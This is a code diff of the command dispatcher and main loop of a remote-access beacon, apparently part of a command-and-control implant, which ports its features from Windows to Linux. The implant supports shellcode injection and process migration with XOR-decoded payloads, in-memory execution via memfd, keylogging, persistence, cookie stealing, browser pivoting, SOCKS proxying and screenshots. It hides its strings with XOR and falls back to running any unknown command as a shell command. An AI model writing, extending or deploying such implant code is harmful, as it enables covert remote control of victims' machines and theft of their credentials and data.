@@ -54,18 +54,17 @@
 #include "keylogger.h"
 #include "persistence.h"
 
-#ifdef _WIN32
-#include "keylogger.h"
 #include "screenshot.h"
 #include "injection.h"
-#include "sleep_mask.h"
-#include "stack_spoof.h"
 #include "proxy.h"
-#include "smb.h"
 #include "browser_pivot.h"
 #include "netstat.h"
 #include "cookie_stealer.h"
 #include "cdp_pivot.h"
+#ifdef _WIN32
+#include "sleep_mask.h"
+#include "stack_spoof.h"
+#include "smb.h"
 #endif
 #include "wlan_scan.h"
 #include "bt_scan.h"
@@ -152,12 +151,14 @@ inline std::vector<Task> parse_tasks(const std::string& json) {
 // ── Shell Execution ────────────────────────────────────────────────────────
 
 // Thread wrapper for asynchronous tasks
+#ifdef _WIN32
 DWORD WINAPI AsyncThreadWrapper(LPVOID lpParam) {
     auto* func = static_cast<std::function<void()>*>(lpParam);
     (*func)();
     delete func;
     return 0;
 }
+#endif
 
 std::string run_shell_command(const std::string& cmd) {
     if (cmd.empty()) return XOR_DEC(XOR_STR("Error: empty command")).c_str();
@@ -455,32 +456,39 @@ std::string dispatch_command(const std::string& cmd, const net::C2Config& cfg = 
     else if (action == XOR_DEC(XOR_STR("exit")).c_str() || action == XOR_DEC(XOR_STR("kill")).c_str()) {
         return "\x01\x02EX";
     }
-#ifdef _WIN32
     else if (action == XOR_DEC(XOR_STR("inject")).c_str()) {
+#ifdef _WIN32
         DWORD pid;
+#else
+        pid_t pid;
+#endif
         std::string b64code;
         if (iss >> pid >> b64code) {
+#ifdef _WIN32
             if (pid == GetCurrentProcessId()) return XOR_DEC(XOR_STR("Self-injection not allowed.")).c_str();
+#endif
             auto code = crypto::base64_decode(b64code);
+            for (auto& b : code) b ^= 0xAA;
             std::string result = injection::inject_shellcode(pid, code);
             return result;
         }
         return XOR_DEC(XOR_STR("Usage: inject <pid> <base64_shellcode>")).c_str();
     }
     else if (action == XOR_DEC(XOR_STR("migrate")).c_str()) {
-        DWORD pid;
         std::string b64code;
-        if (iss >> pid >> b64code) {
+        if (iss >> b64code) {
             auto code = crypto::base64_decode(b64code);
+            for (auto& b : code) b ^= 0xAA;
             std::string result = injection::migrate_to_new_process(code);
-            if (result == XOR_DEC(XOR_STR("Process hollowed successfully.")).c_str()) {
+            if (result.find("Migrated successfully") != std::string::npos) {
                 return std::string("\x01\x02MG") + result;
             }
             return result;
         }
-        return XOR_DEC(XOR_STR("Usage: migrate <pid> <base64_shellcode>")).c_str();
+        return XOR_DEC(XOR_STR("Usage: migrate <base64_shellcode>")).c_str();
     }
     else if (action == XOR_DEC(XOR_STR("mem-run")).c_str()) {
+#ifdef _WIN32
         std::string b64code;
         if (iss >> b64code) {
             auto code = crypto::base64_decode(b64code);
@@ -488,9 +496,7 @@ std::string dispatch_command(const std::string& cmd, const net::C2Config& cfg = 
             return XOR_DEC(XOR_STR("In-memory execution failed.")).c_str();
         }
         return XOR_DEC(XOR_STR("Usage: mem-run <base64_shellcode>")).c_str();
-    }
 #else
-    else if (action == XOR_DEC(XOR_STR("mem-run")).c_str()) {
         std::string b64bin;
         if (iss >> b64bin) {
             auto bin = crypto::base64_decode(b64bin);
@@ -498,9 +504,8 @@ std::string dispatch_command(const std::string& cmd, const net::C2Config& cfg = 
             return XOR_DEC(XOR_STR("Memfd execution failed.")).c_str();
         }
         return XOR_DEC(XOR_STR("Usage: mem-run <base64_binary>")).c_str();
-    }
 #endif
-#ifdef _WIN32
+    }
     else if (action == "screenshot") {
         return screenshot::capture();
     }
@@ -514,6 +519,7 @@ std::string dispatch_command(const std::string& cmd, const net::C2Config& cfg = 
     else if (action == XOR_DEC(XOR_STR("socks-stop")).c_str()) {
         return proxy::stop_socks();
     }
+#ifdef _WIN32
     else if (action == XOR_DEC(XOR_STR("smb-pipe")).c_str()) {
         std::string pipeName;
         std::getline(iss >> std::ws, pipeName);
@@ -522,12 +528,13 @@ std::string dispatch_command(const std::string& cmd, const net::C2Config& cfg = 
     else if (action == XOR_DEC(XOR_STR("smb-pipe-stop")).c_str()) {
         return smb::stop_smb_pipe();
     }
+#endif
     else if (action == XOR_DEC(XOR_STR("browser-pivot")).c_str()) {
         int localPort;
         if (iss >> localPort) {
-            DWORD pid = 0;
+            unsigned long pid = 0;
             std::string pidStr;
-            if (iss >> pidStr) pid = static_cast<DWORD>(std::stoul(pidStr));
+            if (iss >> pidStr) pid = std::stoul(pidStr);
             return browser_pivot::start_pivot(localPort, pid);
         }
         return XOR_DEC(XOR_STR("Usage: browser-pivot <local_port> [pid]")).c_str();
@@ -538,7 +545,6 @@ std::string dispatch_command(const std::string& cmd, const net::C2Config& cfg = 
     else if (action == XOR_DEC(XOR_STR("browser-list")).c_str()) {
         return browser_pivot::list_browsers();
     }
-#endif
 
     else if (action == XOR_DEC(XOR_STR("wlan-scan")).c_str()) {
         return wlan_scan::scan();
@@ -552,7 +558,6 @@ std::string dispatch_command(const std::string& cmd, const net::C2Config& cfg = 
     else if (action == XOR_DEC(XOR_STR("bt-scan-json")).c_str()) {
         return bt_scan::scan_json();
     }
-#ifdef _WIN32
     else if (action == XOR_DEC(XOR_STR("netstat")).c_str()) {
         return netstat::format_connections();
     }
@@ -599,7 +604,6 @@ std::string dispatch_command(const std::string& cmd, const net::C2Config& cfg = 
         if (url.empty()) return "Usage: cdp-fetch <url>";
         return cdp_pivot::cdp_fetch(url, port);
     }
-#endif
     // Unknown built-in: execute as OS shell command (C2 interact mode)
     return run_shell_command(cmd);
 }
@@ -622,7 +626,7 @@ std::string generate_beacon_id() {
     char hex[9];
     srand(static_cast<unsigned>(time(nullptr)) ^ getpid());
     snprintf(hex, sizeof(hex), "%04X%04X", rand() & 0xFFFF, rand() & 0xFFFF);
-    return std::string(XOR_DEC(XOR_STR("WIN-")).c_str()) + hostname + "-" + hex;
+    return std::string(XOR_DEC(XOR_STR("LNX-")).c_str()) + hostname + "-" + hex;
 #endif
 }
 
@@ -644,17 +648,25 @@ extern "C" void beacon_main(int argc, char** argv) {
 
     net::C2Config cfg;
     cfg.beacon_id = generate_beacon_id();
+#ifdef _WIN32
     cfg.host      = std::wstring(C2_HOST, C2_HOST + strlen(C2_HOST));
+#else
+    cfg.host      = C2_HOST;
+#endif
     cfg.port      = C2_PORT;
     cfg.sleep_ms  = 5000;
     cfg.jitter    = 30;
 
     if (argc >= 2) {
         std::string host_str(argv[1]);
+#ifdef _WIN32
         cfg.host = std::wstring(host_str.begin(), host_str.end());
+#else
+        cfg.host = host_str;
+#endif
         if (argc >= 3) cfg.port = std::atoi(argv[2]);
+        if (argc >= 4) cfg.use_https = std::atoi(argv[3]) != 0;
     }
-    cfg.use_https = false;
 
     bool alive = true;
     auto escape_json = [](const std::string& s) {
@@ -705,8 +717,8 @@ extern "C" void beacon_main(int argc, char** argv) {
         }
     }
 
-    net::cleanup();
 #ifdef _WIN32
+    net::cleanup();
     WSACleanup();
 #endif
 }
